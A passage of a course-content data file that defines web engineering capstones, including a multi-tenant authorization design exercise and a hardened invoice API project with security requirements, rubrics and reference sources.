        "Start from the questions every request must answer: who is calling, on behalf of which tenant, with what permissions, on which resource. Then decide which component answers each.",
        "Store the selected tenant in the server-side session, never trust a tenantId parameter from the client, and re-check membership when switching tenants.",
        "For RLS, think about connection pooling: the tenant setting must be per transaction (set_config with is_local true) and the app role must not bypass RLS.",
        "For service-to-service, decide whether downstream services trust the caller's assertion of tenant or re-derive it. Signed, short-lived tokens with an audience per service limit blast radius.",
      ],
      rubric: [
        "Can you point to the exact component and line of reasoning that stops a user in tenant A from reading tenant B's invoice even if one developer forgets a WHERE clause?",
        "If an enterprise customer disables a user in their IdP, how many minutes until that user loses access, and is that written down?",
        "Does the diagram show where every authorization decision is made, not just where login happens?",
        "Are the trade-offs between sessions and tokens, and between RBAC and ABAC, argued for this ERP rather than in general?",
        "Would a security reviewer find any path (worker, export, webhook, admin tool) that bypasses tenant scoping?",
      ],
      stretchGoals: [
        "Model the permission system in a policy engine (Cedar, OPA or OpenFGA) and include example policies and tests.",
        "Design per-tenant encryption keys for sensitive fields (bank accounts) using envelope encryption with a KMS.",
        "Add SAML support alongside OIDC and explain where it differs in validation and risk.",
      ],
      repoChecklist: [
        "DESIGN.md with context, threat model, components, flows, data model, failure modes and trade-offs",
        "Exported architecture diagram (PNG or SVG) with trust boundaries marked",
        "SQL schema for users, tenants, memberships, roles, permissions and identity links, plus example RLS policies",
        "Sequence diagrams (Mermaid or ASCII) for SSO login, tenant switch and a service-to-service call",
        "At least one ADR for the most contested decision (for example sessions vs JWT, or RLS)",
      ],
      relatedLessons: ["authentication-authorization", "application-security", "api-design"],
    },
    {
      slug: "hardened-invoice-api",
      title: "Capstone: Hardened Invoice API",
      kind: "capstone",
      summary:
        "Build the invoices API from your contract with authentication, tenant-scoped authorization, validation, rate limiting, security headers, structured errors and tests, developed through reviewed PRs with ADRs and branch protection.",
      estimatedHours: 30,
      needsDiagram: true,
      designPrompt:
        "Draw the deployed request path and the code structure. Boxes: client, (optional) CDN or reverse proxy, the API process with its middleware chain in order (request id, security headers, CORS, rate limiter, authentication, body validation, route handler), the application layer (use cases with authorization checks), repositories, Postgres (with RLS if used), Redis or another store for rate limits and sessions if used, and the CI pipeline gating main. Arrows must show the order middleware runs in, where tenant context is established and how it reaches the database, where idempotency keys are checked, and which checks must pass in CI before a PR can merge.",
      requirements: [
        "The API implements the invoices contract (create with Idempotency-Key, list with cursor pagination and filters, get, finalize, void) and contract-conformance tests pass against openapi.yaml.",
        "Authentication uses server-side sessions in __Host- cookies or short-lived JWTs (15 minutes or less) with refresh rotation; passwords use argon2id; login has MFA (TOTP) or SSO.",
        "Authorization is tenant-scoped and role-based (at least owner, accountant and viewer) and enforced in use cases; tests prove a viewer cannot finalize and that cross-tenant access returns 404 for every invoice route.",
        "Every request body and query is validated with a strict schema; all errors are RFC 9457 problem details with a correlation id; no stack traces leave the server.",
        "Rate limiting covers login (5 per 15 minutes per account and IP) and writes (for example 60 per minute per tenant) using a shared store, returning 429 with RateLimit headers and Retry-After.",
        "Security headers (CSP, HSTS, X-Content-Type-Options, frame-ancestors or X-Frame-Options, Referrer-Policy) are set and asserted in tests; CI runs npm audit or Dependabot, plus secret scanning.",
        "At least 3 ADRs exist in docs/adr, and the repo has 5 or more merged PRs with descriptions (why, what, risk, how to test) and branch protection on main requiring CI and a review.",
        "Line coverage on the domain and application layers is 80% or higher, with integration tests running against real Postgres in CI.",
      ],
      hints: [
        "Plan the PR sequence before writing code: skeleton and CI, schema and repositories, auth, invoices CRUD with authorization, idempotency and pagination, hardening (headers, rate limits, logging). Each PR should be reviewable in under 30 minutes.",
        "Branch protection on a personal repo still works: require status checks and use a second GitHub account, a friend, or AI-assisted review plus a self-review checklist, and record honestly in each PR description which one you used.",
        "Put the authorization decision in the use case as a small policy function (can(principal, action, invoice)), and test it with a table of roles by actions.",
        "Write the cross-tenant test as a loop over every route in the contract, so a new route without tenant scoping fails automatically.",
        "Good ADR candidates: sessions vs JWT, RLS vs application scoping only, idempotency storage, rate-limit store, error format.",
      ],
      rubric: [
        "If you removed one WHERE tenant_id clause, which test would fail, and would RLS still protect the data?",
        "Can a reviewer understand each PR from its description alone, and does each PR do one thing?",
        "Do your ADRs record alternatives and consequences, or only the choice?",
        "Are all security controls (headers, rate limits, validation, error shape) covered by tests rather than just configured?",
        "Could a new developer clone, run and test the project in under 15 minutes from the README?",
        "Is anything sensitive (passwords, tokens, emails) visible in your logs during a test run?",
      ],
      stretchGoals: [
        "Add Postgres RLS with FORCE ROW LEVEL SECURITY and a test proving an unscoped query returns no foreign rows.",
        "Add OIDC login against a free IdP (Keycloak in docker compose, or a hosted developer tenant) with per-tenant IdP configuration.",
        "Run OWASP ZAP baseline in CI against a preview deployment and fail on high-severity alerts.",
        "Publish invoice.finalized webhooks with HMAC signatures, retries with backoff and a delivery log.",
      ],
      repoChecklist: [
        "README with architecture overview, setup, environment variables, run and test commands, and links to openapi.yaml, ADRs and the diagram",
        "openapi.yaml and contract tests, plus unit, integration and security tests runnable via npm scripts",
        "docs/adr with at least 3 ADRs using a consistent template",
        "CI workflow (lint, typecheck, tests with Postgres, npm audit or Dependabot, secret scan) required by branch protection on main",
        "At least 5 merged PRs with descriptions, visible in the repo's pull request history",
        "Exported diagram (PNG or SVG) of the request path and middleware order",
      ],
      relatedLessons: [
        "api-design",
        "authentication-authorization",
        "application-security",
        "git-code-review-design-docs",
        "networking-for-web-engineers",
      ],
    },
  ],
  sources: [
    {
      label: "MDN Web Docs: HTTP",
      url: "https://developer.mozilla.org/en-US/docs/Web/HTTP",
      kind: "docs",
    },
    {
      label: "High Performance Browser Networking (Ilya Grigorik)",
      url: "https://hpbn.co/",
      kind: "book",
    },
    {
      label: "OWASP Top 10",
      url: "https://owasp.org/www-project-top-ten/",
      kind: "web",
    },
    {
      label: "OWASP Cheat Sheet Series",
      url: "https://cheatsheetseries.owasp.org/",
      kind: "docs",
    },
    {
      label: "Google Engineering Practices: Code Review",
      url: "https://google.github.io/eng-practices/",
      kind: "docs",
    },
  ],
};
